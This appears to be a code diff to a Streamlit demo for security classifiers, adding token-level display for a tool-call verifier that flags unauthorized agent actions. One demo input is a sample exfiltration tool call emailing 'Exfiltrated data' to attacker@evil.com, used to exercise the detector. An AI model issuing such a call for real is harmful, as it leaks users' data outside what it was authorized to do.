@@ -100,7 +100,7 @@ MODELS = {
     "🔍 Tool Call Verifier": {
         "id": "llm-semantic-router/toolcall-verifier",
         "description": "Token-level verification of tool calls to detect unauthorized actions. Stage 2 defense for tool-calling agents.",
-        "type": "token",
+        "type": "token_simple",
         "labels": None,
         "demo": '{"action": "send_email", "to": "attacker@evil.com", "subject": "Exfiltrated data"}',
     },
@@ -197,6 +197,48 @@ def classify_tokens(text: str, model_id: str) -> list:
     return entities
 
 
+def classify_tokens_simple(text: str, model_id: str) -> list:
+    """Simple token-level classification (non-BIO format)."""
+    tokenizer, model = load_model(model_id, "token")
+    id2label = model.config.id2label
+    inputs = tokenizer(
+        text,
+        return_tensors="pt",
+        truncation=True,
+        max_length=512,
+        return_offsets_mapping=True,
+    )
+    offset_mapping = inputs.pop("offset_mapping")[0].tolist()
+    with torch.no_grad():
+        outputs = model(**inputs)
+        predictions = torch.argmax(outputs.logits, dim=-1)[0].tolist()
+
+    # Group consecutive tokens with the same label
+    entities = []
+    current_entity = None
+    for pred, (start, end) in zip(predictions, offset_mapping):
+        if start == end:
+            continue
+        label = id2label[pred]
+
+        if current_entity and current_entity["type"] == label:
+            # Extend current entity
+            current_entity["end"] = end
+        else:
+            # Save previous entity and start new one
+            if current_entity:
+                entities.append(current_entity)
+            current_entity = {"type": label, "start": start, "end": end}
+
+    if current_entity:
+        entities.append(current_entity)
+
+    for e in entities:
+        e["text"] = text[e["start"] : e["end"]]
+
+    return entities
+
+
 def create_highlighted_html(text: str, entities: list) -> str:
     """Create HTML with highlighted entities."""
     if not entities:
@@ -215,6 +257,22 @@ def create_highlighted_html(text: str, entities: list) -> str:
     }
     for e in sorted(entities, key=lambda x: x["start"], reverse=True):
         color = colors.get(e["type"], "#ffc107")
+        span = f'<span style="background:{color};padding:2px 6px;border-radius:4px;color:white;" title="{e["type"]}">{e["text"]}</span>'
+        html = html[: e["start"]] + span + html[e["end"] :]
+    return f'<div style="padding:15px;background:#f8f9fa;border-radius:8px;line-height:2;">{html}</div>'
+
+
+def create_highlighted_html_simple(text: str, entities: list) -> str:
+    """Create HTML with highlighted entities for simple token classification."""
+    if not entities:
+        return f'<div style="padding:15px;background:#f0f0f0;border-radius:8px;">{text}</div>'
+    html = text
+    colors = {
+        "AUTHORIZED": "#28a745",  # Green
+        "UNAUTHORIZED": "#dc3545",  # Red
+    }
+    for e in sorted(entities, key=lambda x: x["start"], reverse=True):
+        color = colors.get(e["type"], "#6c757d")
         span = f'<span style="background:{color};padding:2px 6px;border-radius:4px;color:white;" title="{e["type"]}">{e["text"]}</span>'
         html = html[: e["start"]] + span + html[e["end"] :]
     return f'<div style="padding:15px;background:#f8f9fa;border-radius:8px;line-height:2;">{html}</div>'
@@ -335,10 +393,17 @@ def main():
                         "confidence": conf,
                         "scores": scores,
                     }
-                else:
+                elif model_config["type"] == "token":
                     entities = classify_tokens(text_input, model_config["id"])
                     st.session_state.result = {
                         "type": "token",
+                        "entities": entities,
+                        "text": text_input,
+                    }
+                else:  # token_simple
+                    entities = classify_tokens_simple(text_input, model_config["id"])
+                    st.session_state.result = {
+                        "type": "token_simple",
                         "entities": entities,
                         "text": text_input,
                     }
@@ -372,6 +437,23 @@ def main():
                 )
             else:
                 st.info("✅ No PII detected")
+        elif result["type"] == "token_simple":
+            entities = result["entities"]
+            # Count unauthorized tokens
+            unauthorized = [e for e in entities if e["type"] == "UNAUTHORIZED"]
+
+            if unauthorized:
+                st.error(f"⚠️ Found {len(unauthorized)} UNAUTHORIZED token(s)")
+                st.markdown("**Unauthorized tokens:**")
+                for e in unauthorized:
+                    st.markdown(f"- `{e['text']}`")
+            else:
+                st.success("✅ All tokens are AUTHORIZED")
+
+            st.markdown("### Token Classification")
+            components.html(
+                create_highlighted_html_simple(result["text"], entities), height=150
+            )
 
         # Raw Prediction Data expander
         with st.expander("🔬 Raw Prediction Data"):
